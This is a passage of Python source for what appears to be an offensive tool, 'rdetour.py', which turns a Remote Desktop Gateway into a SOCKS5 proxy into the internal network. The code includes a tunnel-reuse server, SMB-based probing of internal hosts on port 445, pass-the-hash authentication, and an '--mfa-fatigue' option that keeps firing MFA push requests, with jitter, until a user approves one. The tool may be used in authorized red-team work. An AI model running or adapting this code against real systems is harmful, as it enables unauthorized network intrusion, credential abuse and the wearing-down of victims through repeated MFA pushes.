    d = os.environ.get("RDETOUR_CACHE_DIR", os.path.expanduser("~/.rdetour"))
    return os.path.join(d, "killcache-%s-%s.json" %
                        (name, hashlib.sha1(
                            gateway.encode("utf-8")).hexdigest()[:8]))


def load_kill_cache(gateway):
    """Load kill cache, migrating legacy v1 entries if present."""
    entries = {}
    path = kill_cache_path(gateway)
    try:
        with open(path, "r") as f:
            doc = json.load(f)
        if isinstance(doc, dict) and isinstance(doc.get("kills"), dict):
            entries = doc["kills"]
    except FileNotFoundError:
        pass
    except (OSError, ValueError) as e:
        say("[warm] kill cache unreadable (%s) — starting empty" % e)
    try:
        with open(refused445_cache_path(gateway), "r") as f:
            doc = json.load(f)
        if isinstance(doc, dict) and isinstance(doc.get("refused445"), dict):
            for h, ts in doc["refused445"].items():
                key = "%s:445" % h
                if key not in entries and isinstance(ts, (int, float)):
                    entries[key] = ts
    except (FileNotFoundError, OSError, ValueError):
        pass
    now = time.time()
    live = {}
    for key, ts in entries.items():
        if isinstance(ts, (int, float)) and now - ts < REFUSED_CACHE_TTL_S:
            live[key] = min(ts, now)
    v2_existed = os.path.exists(path)
    if len(live) != len(entries) or (live and not v2_existed):
        try:
            save_kill_cache(gateway, live)
        except OSError as e:
            say("[warm] kill cache rewrite failed (%s)" % e)
    return set(live)


def save_kill_cache(gateway, entries):
    """Atomic write."""
    path = kill_cache_path(gateway)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    fd, tmp = tempfile.mkstemp(dir=os.path.dirname(path),
                               prefix=os.path.basename(path) + ".",
                               suffix=".tmp")
    try:
        with os.fdopen(fd, "w") as f:
            json.dump({"version": 2, "gateway": gateway,
                       "kills": entries}, f)
        os.replace(tmp, path)
    except Exception:
        try:
            os.unlink(tmp)
        except OSError:
            pass
        raise


class _PriorityChannelQueue:
    """Gives known-good hosts priority over unknown hosts for the channel."""
    def __init__(self):
        self._lock = threading.Lock()
        self._cv = threading.Condition(self._lock)
        self._busy = False
        self._pri_q = collections.deque()
        self._norm_q = collections.deque()

    def acquire(self, priority, timeout):
        evt = threading.Event()
        with self._lock:
            if priority:
                self._pri_q.append(evt)
            else:
                self._norm_q.append(evt)
            self._maybe_grant()
        got = evt.wait(timeout=timeout)
        if not got:
            with self._lock:
                try:
                    (self._pri_q if priority else self._norm_q).remove(evt)
                except ValueError:
                    if evt.is_set():
                        self._busy = False
                        self._maybe_grant()
        return got

    def release(self):
        with self._lock:
            self._busy = False
            self._maybe_grant()

    def _maybe_grant(self):
        if self._busy:
            return
        q = self._pri_q or self._norm_q
        if q:
            self._busy = True
            q.popleft().set()


class WarmSocksServer(SocksServer):
    """SOCKS5 over one warm tunnel with channel cycling. One MFA push per
    tunnel lifetime. Connections are serialized (one channel at a time)."""

    def __init__(self, args, tunnel_factory, scout_factory=None):
        SocksServer.__init__(self, args, tunnel_factory)
        self.tunnel = None
        self.chan_lock = threading.Lock()
        self.tunnel_lock = threading.Lock()
        self._chan_q = _PriorityChannelQueue()
        self.scout = None
        self.scout_factory = scout_factory or tunnel_factory
        self.scout_lock = threading.Lock()
        self.scout_tunnel_lock = threading.Lock()
        self.known_good = set()
        for th in getattr(args, 'trust_hosts', []):
            self.known_good.add("%s:0" % th.strip().lower())
        self.gw_guid = None
        self.gw_guid_tried = False
        self.gw_ips = set()
        self.stats["gw_dead"] = 0
        self.stats["smb1_local"] = 0
        self.stats["stillborn"] = 0
        self.stats["instakill_cached"] = 0
        self.stats["scout_probes"] = 0
        self.stats["scout_deaths"] = 0
        self.stats["promoted"] = 0
        self.refused_lock = threading.Lock()
        self.kill_cache = load_kill_cache(self.args.gateway)
        say("[warm] kill cache: %d entries loaded from %s" %
            (len(self.kill_cache), kill_cache_path(self.args.gateway)))

    def _abort(self, client, replied, code, msg):
        if replied:
            rst(client)
        else:
            self.fail(client, code, msg)

    def _gateway_ips(self):
        if not self.gw_ips:
            self.gw_ips.add(str(self.args.gateway).lower())
            self.gw_ips.update(("127.0.0.1", "localhost", "::1"))
            try:
                self.gw_ips.update(
                    ai[4][0] for ai in socket.getaddrinfo(
                        self.args.gateway, None, socket.AF_INET))
            except socket.gaierror:
                pass
        return self.gw_ips

    def _ensure_gw_guid(self, t):
        """Learn the gateway's SMB ServerGUID via loopback for the dead-host oracle."""
        if self.gw_guid_tried:
            return self.gw_guid
        self.gw_guid_tried = True
        if not getattr(self.args, "gw_fallback", True):
            return None
        if t.closed:
            return None
        if t.channel_open:
            try:
                t.close_channel()
            except RDGError:
                t.closed = True
                t.suspect = True
                return None
        try:
            t.open_channel(["127.0.0.1"], 445)
            t.write(smb2_negotiate())
            buf = b""
            t0 = time.monotonic()
            while len(buf) < 92 and time.monotonic() - t0 < 5:
                d = t.read(timeout=1)
                if d:
                    buf += d
            g = smb2_server_guid(buf)
            t.close_channel()
            if g:
                self.gw_guid = g
                say("[warm] gateway SMB GUID %s — 445 fallback oracle armed"
                    % g.hex())
            else:
                say("[warm] no SMB2 answer on gateway loopback — "
                    "fallback disabled")
        except (RDGError, ConnectionError, ssl.SSLError, OSError) as e:
            say("[warm] gateway fallback unavailable: %s" % e)
            t.channel_open = False   # baseline channel is dead
            t.closed = True
            t.suspect = True       # discarded without a clean handshake
        return self.gw_guid

    def _ensure_tunnel(self):
        with self.tunnel_lock:
            t = self.tunnel
            if t is not None and not t.closed:
                return t
            if t is not None:
                t.close()
            say("[warm] establishing tunnel — approve the ONE push "
                "(window %ds)" % self.args.auth_timeout)
            t = self.factory(auth_timeout=self.args.auth_timeout)
            t.suspect = False
            self.tunnel = t
            self.stats["pushes"] += 1
            say("[warm] tunnel live — channels from here on are free")
            return t

    def _ensure_scout(self):
        with self.scout_tunnel_lock:
            s = self.scout
            if s is not None and not s.closed:
                return s
            if s is not None:
                s.close()
            say("[scout] establishing scout tunnel (window %ds)"
                % self.args.auth_timeout)
            s = self.scout_factory(auth_timeout=self.args.auth_timeout)
            s.suspect = False
            self.scout = s
            self.stats["pushes"] += 1
            say("[scout] scout tunnel live — probing unknowns")
            return s

    def _kill_remember(self, host, port, why):
        """Persist host:port as tunnel-killer. Returns True if newly added."""
        key = "%s:%d" % (str(host).strip().lower(), port)
        with self.refused_lock:
            if key in self.kill_cache:
                return False
            self.kill_cache.add(key)
            entries = {}
            try:
                with open(kill_cache_path(self.args.gateway), "r") as f:
                    doc = json.load(f)
                if isinstance(doc, dict) and \
                        isinstance(doc.get("kills"), dict):
                    entries = doc["kills"]
            except (OSError, ValueError):
                pass
            entries[key] = time.time()
            try:
                save_kill_cache(self.args.gateway, entries)
            except OSError as e:
                say("[warm] kill cache write failed (%s)" % e)
            say("[warm] %s cached kill (%s) — future connections "
                "answered locally" % (key, why))
            return True

    def handle(self, client):
        t = None
        conn_id = self._next_conn()
        replied = False
        is_scout = False
        try:
            target = self._negotiate(client)
            if target is None:
                return
            host, port = target
            self.args.log("CONNECT %s:%d" % (host, port))
            h = str(host).strip().lower()
            key = "%s:%d" % (h, port)
            if key in self.kill_cache:
                self.stats["stillborn"] += 1
                self.fail(client, 0x05, "refused (cached)")
                say("[conn %d] %s:%d refused (cached) — answered locally, "
                    "tunnel untouched" % (conn_id, host, port))
                return
            sniff = b""
            if port == 445:
                self.reply(client, 0x00)
                replied = True
                client.settimeout(SNIFF_S)
                try:
                    sniff = client.recv(65536)
                except (ConnectionError, socket.timeout, OSError):
                    return
                if not sniff:
                    return
                if smb1_probe(sniff):
                    self.stats["smb1_local"] += 1
                    say("[conn %d] SMB1 probe answered locally (RST) — "
                        "tunnel untouched" % conn_id)
                    rst(client)
                    return
                client.settimeout(None)
            no_scout = getattr(self.args, 'no_scout', False)
            host_known = any(k.startswith(h + ":") for k in self.known_good)
            is_scout = (not no_scout and port == 445
                        and not host_known
                        and key not in self.known_good
                        and not getattr(self.args, 'gw_fallback', True))
            is_priority = (not is_scout and host_known)
            if is_scout:
                lock = self.scout_lock
                if not lock.acquire(timeout=8):
                    self._abort(client, replied, 0x04,
                                "channel queue full")
                    return
            else:
                if not self._chan_q.acquire(is_priority, timeout=8):
                    self._abort(client, replied, 0x04,
                                "channel queue full")
                    return
                lock = None
            try:
                if not sniff:
                    client.setblocking(False)
                    try:
                        peek = client.recv(1, socket.MSG_PEEK)
                        if not peek:
                            return
                    except BlockingIOError:
                        pass
                    except (ConnectionError, OSError):
                        return
                    finally:
                        client.setblocking(True)
                if is_scout:
                    t = self._ensure_scout()
                    self.stats["scout_probes"] += 1
                else:
                    t = self._ensure_tunnel()
                use_fb = False
                if not is_scout:
                    host_is_gw = str(host).lower() in self._gateway_ips()
                    use_fb = (port == 445 and not host_is_gw
                              and self._ensure_gw_guid(t) is not None)
                if t.channel_open:
                    try:
                        t.close_channel()
                    except RDGError:
                        t = self._ensure_tunnel()
                try:
                    t.open_channel([host, "127.0.0.1"] if use_fb else host,
                                   port)
                except (ConnectionError, ssl.SSLError, OSError):
                    say("[conn %d] tunnel dead on channel open — "
                        "rebuilding" % conn_id)
                    t.closed = True
                    try:
                        t.close()
                    except Exception:
                        pass
                    if is_scout:
                        self.scout = None
                        t = self._ensure_scout()
                    else:
                        self.tunnel = None
                        t = self._ensure_tunnel()
                    if use_fb:
                        self._ensure_gw_guid(t)
                    t.open_channel(
                        [host, "127.0.0.1"] if use_fb else host, port)
                except RDGPolicyError:
                    raise
                except RDGUnreachableError:
                    t.closed = True
                    try:
                        t.close()
                    except Exception:
                        pass
                    if is_scout:
                        self.scout = None
                    else:
                        self.tunnel = None
                    raise
                if not replied:
                    self.reply(client, 0x00)
                self.stats["opened"] += 1
                tname = "scout" if is_scout else "warm tunnel"
                say("[conn %d] channel %s:%d on %s%s" %
                    (conn_id, host, port, tname,
                     " (+gw fallback)" if use_fb else ""))

                gw_guid = self.gw_guid
                wrote = [None]
                life = [False]
                auth_failed = [False]
                stillborn = [False]
                gw_loopback = [False]
                t.drain_saw_data = False

                def reader():
                    classified = not use_fb
                    snif = b""
                    snif_t0 = None
                    try:
                        while not t.closed and t.channel_open:
                            d = t.read(timeout=1)
                            if d:
                                life[0] = True
                                if classified:
                                    say("[conn %d] reader: relay %d bytes" %
                                        (conn_id, len(d)))
                                    if len(d) > 16 and d[4:8] == b'\xfeSMB':
                                        _rcmd = struct.unpack_from("<H", d, 16)[0]
                                        _rst = struct.unpack_from("<I", d, 12)[0]
                                        if _rcmd == 1 and _rst >= 0xC0000000:
                                            auth_failed[0] = True
                                    client.sendall(d)
                                    continue
                                snif += d
                                if snif_t0 is None:
                                    snif_t0 = time.monotonic()
                                g = smb2_server_guid(snif)
                                if g is not None and g == gw_guid:
                                    self.stats["gw_dead"] += 1
                                    gw_loopback[0] = True
                                    say("[conn %d] %s:%d DEAD "
                                        "(landed on gateway loopback)" %
                                        (conn_id, host, port))
                                    self._kill_remember(
                                        host, port, "gateway-loopback oracle")
                                    try:
                                        client.shutdown(socket.SHUT_RDWR)
                                    except Exception:
                                        pass
                                    return
                                if g is not None or len(snif) > 4096 or \
                                        time.monotonic() - snif_t0 > 4:
                                    classified = True
                                    client.sendall(snif)
                            elif (not life[0] and wrote[0] is not None and
                                  time.monotonic() - wrote[0] > STILLBORN_S):
                                self.stats["stillborn"] += 1
                                stillborn[0] = True
                                self._kill_remember(host, port, "stillborn")
                                say("[conn %d] %s:%d STILLBORN — granted but"
                                    " silent %.1fs (refused port?): cached"
                                    " local-refuse" %
                                    (conn_id, host, port, STILLBORN_S))
                                try:
                                    client.shutdown(socket.SHUT_RDWR)
                                except Exception:
                                    pass
                                return
                    except Exception as _re:
                        say("[conn %d] reader exit: %s" %
                            (conn_id, _re))
                    try:
                        client.shutdown(socket.SHUT_RDWR)
                    except Exception:
                        pass

                rt = threading.Thread(target=reader, daemon=True)
                rt.start()
                client.settimeout(15)
                if sniff:
                    wrote[0] = time.monotonic()
                    t.write(sniff)
                try:
                    while not t.closed and t.channel_open:
                        try:
                            d = client.recv(65536)
                        except (ConnectionError, socket.timeout, OSError) as _we:
                            say("[conn %d] writer: client error %s" %
                                (conn_id, _we))
                            break
                        if not d:
                            say("[conn %d] writer: client EOF" % conn_id)
                            break
                        if wrote[0] is None:
                            wrote[0] = time.monotonic()
                        _cmd = ""
                        _smb2_cmd = -1
                        if len(d) > 16 and d[4:8] == b'\xfeSMB':
                            _smb2_cmd = struct.unpack_from("<H", d, 16)[0]
                            _cmd = " SMB2 cmd=%d" % _smb2_cmd
                        elif len(d) > 8 and d[4:8] == b'\xffSMB':
                            _cmd = " SMB1"
                        if _smb2_cmd >= 2 and not host_known:
                            say("[conn %d] writer: drop %d bytes%s "
                                "(first-contact gate)" %
                                (conn_id, len(d), _cmd))
                            break
                        if _smb2_cmd >= 2 and auth_failed[0]:
                            say("[conn %d] writer: drop %d bytes%s "
                                "(auth failed)" %
                                (conn_id, len(d), _cmd))
                            break
                        say("[conn %d] writer: fwd %d bytes%s" %
                            (conn_id, len(d), _cmd))
                        t.write(d)
                finally:
                    preempt_sent = False
                    _t0 = time.monotonic()
                    if not t.closed and not t._srv_closed_channel \
                            and t.channel_open \
                            and hasattr(t, 'send_packet'):
                        try:
                            t.send_packet(pkt(0x10, u32(0)))
                            preempt_sent = True
                            say("[conn %d] preemptive close sent "
                                "(%.3fs after writer exit)" %
                                (conn_id, time.monotonic() - _t0))
                        except (ConnectionError, ssl.SSLError, OSError):
                            say("[conn %d] preemptive close FAILED "
                                "(tunnel already dead)" % conn_id)
                            t.closed = True
                    elif t.closed:
                        say("[conn %d] skipped preempt — tunnel already "
                            "dead (reader saw abort)" % conn_id)
                    t.channel_open = False
                    rt.join(timeout=10)
                    _no_real_traffic = (wrote[0] is None
                                        or gw_loopback[0]
                                        or stillborn[0]
                                        or auth_failed[0])
                    if _no_real_traffic and t.closed and preempt_sent:
                        t.closed = False
                        t.suspect = False
                        t.last_close_abrupt = True
                    if rt.is_alive():
                        say("[conn %d] reader stuck — discarding tunnel" %
                            conn_id)
                        t.closed = True
                        t.suspect = True
                        t.close()
                    elif not t.closed and not t._srv_closed_channel:
                        if stillborn[0]:
                            p = t.recv_packet(timeout=1)
                            if p and p[0] == 0x11:
                                t.last_close_abrupt = False
                            else:
                                t.last_close_abrupt = True
                        elif preempt_sent:
                            _blackhole = (wrote[0] is not None
                                          and not life[0])
                            _drain_t = 30 if _blackhole else (1 if _no_real_traffic else 5)
                            if _blackhole:
                                say("[conn %d] blackhole likely — waiting "
                                    "%ds for gateway TCP timeout"
                                    % (conn_id, _drain_t))
                            p = t.recv_packet(timeout=_drain_t)
                            if p and p[0] == 0x11:
                                t.last_close_abrupt = False
                            elif p and p[0] == 0x10:
                                t._srv_closed_channel = True
                                t._srv_close_ptype = 0x10
                                t.last_close_abrupt = True
                                t.suspect = True
                                if len(p[1]) >= 4:
                                    t.last_srv_close_reason = struct.unpack(
                                        "<I", p[1][:4])[0]
                                say("[conn %d] cross-close 0x10 in drain "
                                    "(reason 0x%08x)" %
                                    (conn_id,
                                     getattr(t, 'last_srv_close_reason', 0)))
                                if t.last_srv_close_reason == 0x800759D8:
                                    t.closed = True
                            elif p:
                                say("[conn %d] drain: unexpected ptype "
                                    "0x%x — tunnel dead" %
                                    (conn_id, p[0]))
                                t.closed = True
                                t.suspect = True
                            else:
                                if _no_real_traffic or _blackhole:
                                    say("[conn %d] drain: no ack after %ds "
                                        "— channel lost" %
                                        (conn_id, _drain_t))
                                    t.last_close_abrupt = True
                                else:
                                    say("[conn %d] drain: no ack after %ds "
                                        "— tunnel dead" %
                                        (conn_id, _drain_t))
                                    t.closed = True
                                    t.suspect = True
                            if _blackhole:
                                if self._kill_remember(
                                        host, port,
                                        "blackhole (no SMB response)"):
                                    self.stats["instakill_cached"] += 1
                                    say("[!] cached %s:%d — blackhole%s"
                                        % (host, port,
                                           "" if t.closed
                                           else " (tunnel survived)"))
                        else:
                            try:
                                t._close_channel_xchg()
                                t.last_close_abrupt = False
                            except RDGError:
                                t.closed = True
                                t.suspect = True
                    elif not t.closed:
                        if getattr(t, '_srv_close_ptype', None) == 0x11:
                            t.last_close_abrupt = False
                        else:
                            t.last_close_abrupt = True
                            t.suspect = True
                    if t.closed:
                        if is_scout:
                            with self.scout_tunnel_lock:
                                if self.scout is t:
                                    self.scout = None
                            self.stats["scout_deaths"] += 1
                        else:
                            with self.tunnel_lock:
                                if self.tunnel is t:
                                    self.tunnel = None
                    if t.closed and wrote[0] is not None \
                            and not life[0] \
                            and not getattr(t, "drain_saw_data", False) \
                            and not getattr(t, "suspect", False):
                        if self._kill_remember(host, port,
                                               "first-contact RST abort"):
                            self.stats["instakill_cached"] += 1
                    _abort_reason = getattr(t, "last_srv_close_reason", None)
                    if is_scout and not t.closed:
                        self.known_good.add(key)
                        self.stats["promoted"] += 1
                    elif use_fb and not is_scout \
                            and life[0] and not t.closed:
                        self.known_good.add(key)
                        say("[conn %d] %s promoted to known_good"
                            % (conn_id, key))
                    why = ""
                    r = _abort_reason
                    if r == 0x800759D8:
                        why = " — 0x800759D8 TUNNEL DEAD"
                    elif r:
                        why = " — server closed channel (0x%08x)" % r
                    ack = getattr(t, '_srv_close_ptype', None)
                    if ack == 0x11 and not t.closed:
                        why = " — clean ack (preemptive close won)"
                    tl = "scout" if is_scout else "tunnel"
                    say("[conn %d] channel %s:%d closed — %s %s%s" %
                        (conn_id, host, port, tl,
                         "dead" if t.closed else "stays warm", why))
            finally:
                if lock is not None:
                    lock.release()
                else:
                    self._chan_q.release()
        except MfaNotApproved as e:
            self.stats["failed"] += 1
            self._abort(client, replied, 0x02, "mfa not approved: %s" % e)
            say("[warm] push not approved — retry the connection to re-push")
        except RDGPolicyError as e:
            self.stats["failed"] += 1
            self._abort(client, replied, 0x02,
                        "policy: %s (tunnel discarded)" % e)
        except RDGAuthError as e:
            self.stats["failed"] += 1
            self._abort(client, replied, 0x01, "auth: %s" % e)
        except RDGUnreachableError as e:
            self.stats["failed"] += 1
            self._abort(client, replied, 0x03,
                        "unreachable via gateway: %s" % e)
        except (RDGError, ConnectionError, socket.timeout, OSError) as e:
            self.stats["failed"] += 1
            self._abort(client, replied, 0x03, "tunnel/network: %r" % e)
            if t is not None:
                t.closed = True
                t.close()
            if is_scout:
                with self.scout_tunnel_lock:
                    if self.scout is t:
                        self.scout = None
            else:
                with self.tunnel_lock:
                    if self.tunnel is t:
                        self.tunnel = None
        finally:
            try:
                client.close()
            except Exception:
                pass

    def serve(self):
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((self.args.socks_host, self.args.socks_port))
        srv.listen(512)
        print("[*] SOCKS5 %s:%d via %s:%d as %s" %
              (self.args.socks_host, self.args.socks_port, self.args.gateway,
               self.args.gport, self.args.ident_label), flush=True)
        try:
            self._ensure_tunnel()
        except Exception as e:
            print("[!] initial tunnel failed: %s — will retry on first "
                  "connection" % e, flush=True)
        try:
            while True:
                c, _ = srv.accept()
                threading.Thread(target=self.handle, args=(c,),
                                 daemon=True).start()
        except KeyboardInterrupt:
            print("\n[*] opened=%d failed=%d pushes=%d "
                  "smb1_local=%d stillborn=%d instakill=%d "
                  "kill_cache=%d scout=%d/%d/%d" %
                  (self.stats["opened"], self.stats["failed"],
                   self.stats["pushes"], self.stats["smb1_local"],
                   self.stats["stillborn"], self.stats["instakill_cached"],
                   len(self.kill_cache), self.stats["scout_probes"],
                   self.stats["scout_deaths"], self.stats["promoted"]))


def parse_args(argv=None):
    ap = argparse.ArgumentParser(
        prog="rdetour.py",
        description="Turn an RD Gateway into a SOCKS5 proxy into its network.")
    ap.add_argument("-g", "--gateway", required=True,
                    help="RD Gateway host (FQDN or IP)")
    ap.add_argument("--gport", type=int, default=443)
    ap.add_argument("--rdg-path", default="/remoteDesktopGateway/",
                    help="IIS RDG virtual directory (default: %(default)s)")
    ap.add_argument("-u", "--user", required=True,
                    help="DOMAIN\\\\user or user@domain or bare user (+ -d)")
    ap.add_argument("-d", "--domain", help="domain (optional)")
    ap.add_argument("-p", "--password", default="",
                    help="password (fallback: env RDETOUR_PASSWORD)")
    ap.add_argument("--hashes", help="LM:NT (pass-the-hash)")
    ap.add_argument("--socks-host", default="127.0.0.1")
    ap.add_argument("--socks-port", type=int, default=1080)
    ap.add_argument("--timeout", type=int, default=15,
                    help="TCP/TLS connect timeout (default: %(default)s)")
    ap.add_argument("--auth-timeout", type=int, default=60,
                    help="MFA approval window in seconds (default: %(default)s)")
    ap.add_argument("--client-name", help="tunnel client name (default: hostname)")
    ap.add_argument("--ext-auth", choices=["none", "sspi_ntlm", "paa"],
                    default="none",
                    help="extended-auth mode (default: %(default)s)")
    ap.add_argument("--paa-cookie", help="PAA cookie string (with --ext-auth paa)")
    ap.add_argument("--mfa-fatigue", action="store_true",
                    help="retry tunnel auth on a cadence; each attempt "
                         "triggers a fresh MFA push until approved")
    ap.add_argument("--mfa-interval", type=int, default=60,
                    help="seconds between pushes (default: %(default)s)")
    ap.add_argument("--mfa-jitter", type=int, default=0,
                    help="+/- random seconds on the interval (default: %(default)s)")
    ap.add_argument("--no-gw-fallback", dest="gw_fallback",
                    action="store_false", default=True,
                    help="disable 445 gateway-loopback fallback")
    ap.add_argument("--mfa-max", type=int, default=0,
                    help="stop after N pushes, 0 = unlimited (default: %(default)s)")
    ap.add_argument("--mfa-auth-timeout", type=int, default=65,
                    help="seconds to await push approval per attempt "
                         "(default: %(default)s)")
    ap.add_argument("--no-scout", dest="no_scout", action="store_true",
                    default=False,
                    help="disable scout tunnel (single-tunnel mode)")
    ap.add_argument("--trust-host", dest="trust_hosts", action="append",
                    default=[],
                    help="pre-trust a host (skip scout, use warm tunnel); "
                         "repeatable")
    ap.add_argument("--no-session-reuse", dest="session_reuse",
                    action="store_false", default=True,
                    help="disable cookie/session reuse across tunnel rebuilds")
    ap.add_argument("-v", "--verbose", action="store_true")
    args = ap.parse_args(argv)

    if "\\" in args.user:
        dom, user = args.user.split("\\", 1)
        args.domain = args.domain or dom
        args.user = user
    elif "@" in args.user and not args.domain:
        args.user, args.domain = args.user.split("@", 1)
    if not args.password:
        args.password = os.environ.get("RDETOUR_PASSWORD", "")
    args.nthash = args.hashes.split(":")[1] if args.hashes else None
    if args.nthash is None and not args.password:
        ap.error("need -p, --hashes, or env RDETOUR_PASSWORD")
    if args.mfa_jitter and args.mfa_jitter >= args.mfa_interval:
        ap.error("--mfa-jitter must be smaller than --mfa-interval")

    def log(msg):
        if args.verbose:
            print("[socks]", msg, file=sys.stderr, flush=True)

    args.log = log
    args.ident_label = "%s\\%s" % (args.domain or "?", args.user)
    return args


def main(argv=None):
    args = parse_args(argv)
    jar = {} if getattr(args, "session_reuse", True) else None

    def factory(host=None, port=None, auth_timeout=15):
        t = RDGTunnel(args.gateway, args.gport, args.domain, args.user,
                      args.password, nthash=args.nthash, path=args.rdg_path,
                      client_name=args.client_name,
                      connect_timeout=args.timeout, verbose=args.verbose,
                      ext_auth=args.ext_auth, paa_cookie=args.paa_cookie,
                      session_jar=jar)
        if host is not None:
            t.connect_tunnel(host, port, auth_timeout=auth_timeout)
        else:
            t.establish(auth_timeout=auth_timeout)
        return t

    WarmSocksServer(args, factory, scout_factory=factory).serve()
    return 0


if __name__ == "__main__":
    sys.exit(main())
